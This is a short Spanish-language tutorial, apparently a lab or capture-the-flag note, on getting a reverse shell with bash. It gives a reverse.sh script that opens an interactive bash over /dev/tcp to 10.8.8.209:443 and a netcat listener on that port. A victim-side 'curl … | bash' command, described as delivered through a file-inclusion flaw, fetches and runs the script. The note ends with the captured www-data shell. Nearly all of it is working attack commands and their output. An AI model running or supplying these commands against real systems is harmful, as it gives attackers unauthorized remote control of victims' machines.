# Conexiones Reversas
### _Conexion reversa con bash_ | Reverse connection with bash
____
Para crear una conexion reversa, en este caso, utilizaremos bin bash, por lo que se deben seguir los siguientes pasas

 #### 1. Script bash 
```bat
       │ File: reverse.sh
───────┼─────────────────────────────────────────────────────────────────────────────────────────
   1   │ #/bin/bash
   2   │ bash -i >& /dev/tcp/10.8.8.209/443 0>&1
───────┴─────────────────────────────────────────────────────────────────────────────────────────
```
>*_Nota_*: En caso de no estar logueado con el usuario root, ejecutar con el comando sudo, para elevar privilegios, para validar que esta funcionando el servidor web podemos hacer una petición por el explorador a la ruta http://localhost:80/

#### 2. Levantar servicio netcat

Para ejecutar una shell reversa vamos a crear la comunicación utilizando el servicio de netcat o **_nc_**, para los amigos, y abrir un puerto de comunicación para poner en escucha. 
>```bat
>root$nc -nlvp 443
>listening on [any] 443 ...
>```
#### 3. Ejecutar la comunicación desde el equipo víctima.
Para hacer la carga del LFI, para este ejercicio supondremos,  que esta petinición se puede hacer desde el equipo victima, y para descar el archivo reverse.sh utilizaremos un servidor web para obtener el LFI.
>```bat
>/usr/bin/curl 10.8.8.209/reverse.sh|bash
>```
#### 4. Resultado.

Si el proceso se realizó correctamente, podemos verificar la conexion en el siguiente resultado en la tercera línea.

>```bat
>root$nc -nlvp 443
>listening on [any] 443 ...
>connect to [10.8.8.209] from (UNKNOWN) [10.10.252.152] 49562  
>www-data@ip-10-10-252-152:/var/www/html$ 
>```
